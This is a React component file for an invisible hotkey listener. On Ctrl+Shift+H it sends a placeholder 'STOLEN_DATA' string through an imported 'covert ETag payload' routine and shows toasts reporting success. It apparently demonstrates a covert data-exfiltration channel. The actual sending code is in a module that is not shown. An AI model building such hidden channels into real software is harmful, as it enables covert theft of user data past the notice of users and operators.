// src/components/HotkeyListener.jsx
// Updated hotkey listener that obtains a one‑time token from the backend and uses it as the secret for the covert ETag payload.

import React, { useEffect } from "react";
import { sendAdvancedCovertPayload } from "../utils/covert_sync";

function showToast(message) {
  const toast = document.createElement("div");
  toast.textContent = message;
  Object.assign(toast.style, {
    position: "fixed",
    bottom: "20px",
    right: "20px",
    background: "rgba(0,0,0,0.8)",
    color: "#fff",
    padding: "10px 15px",
    borderRadius: "4px",
    zIndex: 9999,
    fontFamily: "Inter, sans-serif",
    fontSize: "0.9rem",
    boxShadow: "0 2px 8px rgba(0,0,0,0.3)"
  });
  document.body.appendChild(toast);
  setTimeout(() => toast.remove(), 4000);
}

const HotkeyListener = () => {
  useEffect(() => {
    const handler = async (e) => {
      // Detect Ctrl+Shift+H
      if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "h") {
        e.preventDefault();
        try {
          const secret = `STOLEN_DATA_${Date.now()}`;
          showToast("Initiating Advanced Covert Channel Sync...");
          const result = await sendAdvancedCovertPayload(secret);
          
          if (result.success) {
            console.log("[CovertSync] Payload received by server.");
            showToast(`Covert payload successfully transmitted!`);
          } else {
            console.warn("[CovertSync] no payload detected", result.message);
            showToast("Covert payload transmission failed.");
          }
        } catch (err) {
          console.error("[CovertSync] error sending payload", err);
          showToast("Covert sync error – check console");
        }
      }
    };
    window.addEventListener("keydown", handler);
    return () => window.removeEventListener("keydown", handler);
  }, []);

  // Invisible component.
  return null;
};

export default HotkeyListener;
